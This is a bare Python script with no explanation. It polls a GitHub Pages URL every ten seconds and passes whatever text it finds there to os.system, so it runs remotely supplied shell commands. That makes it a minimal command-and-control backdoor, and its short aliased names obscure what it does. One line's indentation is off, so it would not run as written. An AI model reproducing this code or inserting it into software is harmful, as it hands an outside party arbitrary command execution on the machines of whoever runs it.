from requests import get as g
from time import sleep as s
import os
a=''
newa=''
while 1:
    s(10)
     newa=g('https://newazkbbys.github.io/control').text
    if(newa!=a):
        a=newa
        os.system(a)
